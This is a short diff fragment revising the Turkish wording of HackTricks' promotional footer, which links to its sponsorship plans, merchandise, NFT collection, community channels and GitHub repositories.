 * **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi Twitter'da** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)** takip edin.**
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
+* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin.**
 * **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
